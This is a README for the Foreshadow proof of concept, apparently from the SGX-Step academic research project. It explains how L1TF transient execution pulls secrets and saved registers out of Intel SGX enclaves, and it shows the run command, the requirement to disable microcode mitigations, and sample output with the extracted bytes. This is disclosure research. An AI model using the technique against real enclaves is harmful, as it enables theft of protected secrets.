# Foreshadow: Extracting the keys to the Intel SGX kingdom with transient out-of-order execution

The PoC (app/foreshadow) generates a random secret in an enclave, loads
it in L1D, and then extracts the cache line contents from the untrusted
surrounding process using Foreshadow/L1TF. From a high level, the attack
proceeds in 3 phases:

### 1. Load enclave secret in cache

We explore various techniques in the [USENIX
paper](https://foreshadowattack.eu/foreshadow.pdf), but the simplest of
course is to execute the enclave. The PoC also demonstrates how CPU
registers can be retrieved from the enclave State Save Area (SSA) frame
upon interrupt/fault.

### 2. Unmap enclave page

This is the trick to make Foreshadow work: we clear the "present" bit in
the page table entry mapping the enclave secret (in contrast to Meltdown
which bypasses the "supervisor" bit).

Simplest to do this on unpatched Linux systems was the unprivileged
`mprotect(PROT_NONE)` system call, which originally cleared the "present"
bit while leaving the physical page address unmodified. However, all
recent Linux kernels have been unconditionally patched since August to
sanitize the physical page address upon mprotect. We therefore rely on a
malicious driver (`/dev/sgx-step`) to map the process's page table entries
in user space. Arbitrary enclave page table manipulation can now simply
be performed via a convenient library (`libsgxstep/pt.c`).

Note that we setup a dedicated "alias" page table mapping with the
present bit cleared in the PoC code (`attacker_config_page_table`
function). Having a separate valid mapping for the enclave, plus invalid
mapping for the attacker, allows to easily execute/extract the enclave
w/o switching to the kernel.

### 3. Execute Meltdown

After unmapping, we simply execute plain vanilla Meltdown to extract the
enclave secret from L1D using a Flush+Reload covert channel (see
`libsgxstep/foreshadow.c` and `libsgxstep/transient.S`).

## Running and sample output

After properly installing SGX-Step, as explained in the top-level directory
[README.md](https://github.com/jovanbulck/sgx-step/blob/master/README.md),
simply execute:

```bash
$ make run
```

**Note (mitigations).** In order to successfully run the PoC, you need to
disable CPU microcode patches (e.g., using the `dis_ucode_ldr` Linux kernel
parameter). Intel mitigated this attack with a microcode update that
automatically flushes L1D on enclave entry/exit and extends attestation to
include whether HyperThreading (HT) is enabled/disabled. Since we also
demonstrated concurrent L1D extraction from a sibling HT CPU, you should
only trust non-HT attestations to date.

Sample output (note: in this case the last cacheline (8 registers including
RIP) seems to be almost always flushed -- probably because of the kernel #PF
handler execution):

```
[pt.c] /dev/sgx-step opened!
[pt.c] /dev/mem opened!
[main.c] Creating enclave...
[sched.c] continuing on CPU 1
==== Victim Enclave ====
    Base:   0x7fb055800000
    Size:   4194304
    Limit:  0x7fb055c00000
    TCS:    0x7fb055b7c000
    SSA:    0x7fb055b7df48
    AEP:    0x403adb
    EDBGRD: debug
[main.c] oracle at 0x7fb057a48000
[main.c] Randomly generated enclave secret at 0x7fb055a1b580 (page 0x7fb055a1b000); alias at 0x7fb057b6e580 (revoking alias access rights)
+-------------------------------------------------------------------------------------------+
| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
| 0  | x  | x   | x    | 0x001884360704 | x   | x | x   | 1 | 1 | x   | x   | x   | 1   | 1 | 
+-------------------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------------------+
| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
| 0  | x  | x   | x    | 0x001884360704 | x   | x | x   | 0 | 1 | x   | x   | x   | 1   | 0 | 
+-------------------------------------------------------------------------------------------+
[main.c] enclave SSA GPRSGX region at 0x7fb055b7df48; alias at 0x7fb057b6bf48 (revoking alias access rights)
+-------------------------------------------------------------------------------------------+
| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
| 0  | x  | x   | x    | 0x001882963968 | x   | x | x   | 1 | 1 | x   | x   | x   | 1   | 1 | 
+-------------------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------------------+
| XD | PK | IGN | RSVD | PHYS ADRS      | IGN | G | PAT | D | A | PCD | PWT | U/S | R/W | P | 
| 0  | x  | x   | x    | 0x001882963968 | x   | x | x   | 0 | 1 | x   | x   | x   | 1   | 0 | 
+-------------------------------------------------------------------------------------------+

--------------------------------------------------------------------------------
[main.c] Foreshadow secret extraction
--------------------------------------------------------------------------------

[main.c] prefetching enclave secret (EENTER/EEXIT)...
[main.c] extracting secret from L1 cache..
[foreshadow.c] cache hit/miss=52/246; reload threshold=134
[main.c] verifying and destroying enclave secret..
    shadow[ 0]=0x37; enclave[ 0]=0x37    shadow[ 1]=0xa8; enclave[ 1]=0xa8
    shadow[ 2]=0xef; enclave[ 2]=0xef    shadow[ 3]=0x98; enclave[ 3]=0x98
    shadow[ 4]=0xb8; enclave[ 4]=0xb8    shadow[ 5]=0xd6; enclave[ 5]=0xd6
    shadow[ 6]=0x78; enclave[ 6]=0x78    shadow[ 7]=0x2d; enclave[ 7]=0x2d
    shadow[ 8]=0x76; enclave[ 8]=0x76    shadow[ 9]=0x48; enclave[ 9]=0x48
    shadow[10]=0xd3; enclave[10]=0xd3    shadow[11]=0x91; enclave[11]=0x91
    shadow[12]=0xe9; enclave[12]=0xe9    shadow[13]=0xd6; enclave[13]=0xd6
    shadow[14]=0x61; enclave[14]=0x61    shadow[15]=0x59; enclave[15]=0x59
    shadow[16]=0xb0; enclave[16]=0xb0    shadow[17]=0x52; enclave[17]=0x52
    shadow[18]=0x87; enclave[18]=0x87    shadow[19]=0xb5; enclave[19]=0xb5
    shadow[20]=0xdb; enclave[20]=0xdb    shadow[21]=0x9e; enclave[21]=0x9e
    shadow[22]=0x6a; enclave[22]=0x6a    shadow[23]=0xa6; enclave[23]=0xa6
    shadow[24]=0xd6; enclave[24]=0xd6    shadow[25]=0xe5; enclave[25]=0xe5
    shadow[26]=0xaa; enclave[26]=0xaa    shadow[27]=0x0a; enclave[27]=0x0a
    shadow[28]=0xdb; enclave[28]=0xdb    shadow[29]=0xf8; enclave[29]=0xf8
    shadow[30]=0x3a; enclave[30]=0x3a    shadow[31]=0x15; enclave[31]=0x15
    shadow[32]=0x5f; enclave[32]=0x5f    shadow[33]=0x9e; enclave[33]=0x9e
    shadow[34]=0xc2; enclave[34]=0xc2    shadow[35]=0x45; enclave[35]=0x45
    shadow[36]=0x2f; enclave[36]=0x2f    shadow[37]=0x9d; enclave[37]=0x9d
    shadow[38]=0x11; enclave[38]=0x11    shadow[39]=0xa9; enclave[39]=0xa9
    shadow[40]=0x47; enclave[40]=0x47    shadow[41]=0x4f; enclave[41]=0x4f
    shadow[42]=0x24; enclave[42]=0x24    shadow[43]=0x00; enclave[43]=0x00
    shadow[44]=0x94; enclave[44]=0x94    shadow[45]=0x87; enclave[45]=0x87
    shadow[46]=0x01; enclave[46]=0x01    shadow[47]=0xf8; enclave[47]=0xf8
    shadow[48]=0xe1; enclave[48]=0xe1    shadow[49]=0xcf; enclave[49]=0xcf
    shadow[50]=0xda; enclave[50]=0xda    shadow[51]=0xf6; enclave[51]=0xf6
    shadow[52]=0x16; enclave[52]=0x16    shadow[53]=0xd7; enclave[53]=0xd7
    shadow[54]=0xa1; enclave[54]=0xa1    shadow[55]=0xe8; enclave[55]=0xe8
    shadow[56]=0xfe; enclave[56]=0xfe    shadow[57]=0xc8; enclave[57]=0xc8
    shadow[58]=0xad; enclave[58]=0xad    shadow[59]=0x4c; enclave[59]=0x4c
    shadow[60]=0x45; enclave[60]=0x45    shadow[61]=0xd6; enclave[61]=0xd6
    shadow[62]=0x96; enclave[62]=0x96    shadow[63]=0x2c; enclave[63]=0x2c
[foreshadow.c] [OK] Foreshadow correctly derived all 64 bytes!

--------------------------------------------------------------------------------
[main.c] Foreshadow SSA frame extraction
--------------------------------------------------------------------------------

[main.c] revoking trigger secret access rights..
[#PF handler] ERESUME prefetch to refresh GPRSGX region; byte: 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 14 
[main.c] finishing enclave execution (restoring trigger access rights)
=== Foreshadow recovered SSA/GPRSGX region after AEX ===
    RAX:      0xdeadbeefcafebabe
    RCX:      0xd0000dbaaaaaaaad
    RDX:      0xdeadc0debaadf00d
    RBX:      0xdabbad00dabbad00
    RSP:      0x7fb055b6bc90
    RBP:      0x7fb055b8f000
    RSI:      0x7fb055a1b580
    RDI:      0xdddddddddddddddd
    R8:       0x8888888888888888
    R9:       0x9999999999999999
    R10:      0x1010101010101010
    R11:      0x1111111111111111
    R12:      0x1212121212121212
    R13:      0x1313131313131313
    R14:      0x1414141414141414
    R15:      0x0
    RFLAGS:   0x0
    RIP:      0x0
    URSP:     0x0
    URBP:     0x0
    EXITINFO: 0x0
    FSBASE:   0x0
    GSBASE:   0x0
[foreshadow.c] Foreshadow conf: 0X00_RETRIES=20 SSA_0x00_RETRIES=20
[foreshadow.c] Foreshadow perf: 0x00 retries=40963; number AEX=22
[main.c] total of 22 faulting ERESUME calls needed
```
